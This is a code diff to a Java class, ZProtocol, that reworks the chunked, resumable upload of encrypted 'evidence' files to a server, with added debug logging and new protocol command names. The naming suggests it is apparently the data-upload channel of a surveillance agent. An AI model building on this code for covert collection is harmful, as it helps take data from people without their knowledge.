@@ -1096,29 +1096,48 @@ public class ZProtocol extends Protocol {
 
 		final byte[] requestBase = new byte[5 * 4];
 
-		byte[] evid = SHA1Digest.get(file.getFilename().getBytes(), 0, 4);
-		System.arraycopy(evid, 0, requestBase, 0, evid.length);
-		System.arraycopy(Utils.intToByteArray(size), 0, requestBase, 12, 4);
+		byte[] evid = SHA1Digest.get(file.getFilename().getBytes());
+		writeBuf(requestBase, 0, evid, 0, 4);
+		writeBuf(requestBase, 12, size);
 
-		byte[] response = command(Proto.EVOFFSET, requestBase);
+		byte[] response = command(Proto.EVIDENCE_CHUNK, requestBase);
 
 		int base = parseLogOffset(response);
 		boolean full = false;
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG
+					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
+		}
+
 		// TODO: uscita quando finisce
 		while (base < size) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (sendResumeEvidence), base: " + base + " size: " + size);
+			}
 			byte[] content = file.read(base, chunk);
+			if (content.length < chunk) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (sendResumeEvidence), smaller read: " + content.length);
+				}
+			}
 			byte[] plainOut = new byte[content.length + 16];
 
-			writeBuf(plainOut, 0, evid);
+			writeBuf(plainOut, 0, evid, 0, 4);
 			writeBuf(plainOut, 4, base);
-			writeBuf(plainOut, 8, chunk);
+			writeBuf(plainOut, 8, content.length);
 			writeBuf(plainOut, 12, size);
 			writeBuf(plainOut, 16, content);
 
-			response = command(Proto.EVOFFSET, plainOut);
+			response = command(Proto.EVIDENCE_CHUNK, plainOut);
 			base = parseLogOffset(response);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (sendResumeEvidence), base returned: " + base);
+			}
 			if (base == size) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (sendResumeEvidence): full");
+				}
 				full = true;
 			}
 			if (base <= 0) {
@@ -1142,12 +1161,16 @@ public class ZProtocol extends Protocol {
 
 	}
 
+	private void writeBuf(byte[] buffer, int pos, byte[] content) {
+		System.arraycopy(content, 0, buffer, pos, content.length);
+	}
+
 	private void writeBuf(byte[] buffer, int pos, int whatever) {
 		System.arraycopy(Utils.intToByteArray(whatever), 0, buffer, pos, 4);
 	}
 
-	private void writeBuf(byte[] buffer, int pos, byte[] whatever) {
-		System.arraycopy(whatever, 0, buffer, pos, whatever.length);
+	private void writeBuf(byte[] buffer, int pos, byte[] whatever, int offset, int len) {
+		System.arraycopy(whatever, offset, buffer, pos, len);
 	}
 
 	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
@@ -1171,7 +1194,7 @@ public class ZProtocol extends Protocol {
 		System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
 		System.arraycopy(content, 0, plainOut, 4, content.length);
 
-		byte[] response = command(Proto.LOG, plainOut);
+		byte[] response = command(Proto.EVIDENCE, plainOut);
 		final boolean ret = parseLog(response);
 
 		if (ret) {
@@ -1210,7 +1233,10 @@ public class ZProtocol extends Protocol {
 	 */
 	protected int parseLogOffset(final byte[] result) throws ProtocolException {
 		if (checkOk(result)) {
-			return Utils.byteArrayToInt(result, 4);
+			if (Utils.byteArrayToInt(result, 4) == 4) {
+				return Utils.byteArrayToInt(result, 8);
+			}
+			return 0;
 		}
 
 		return -1;
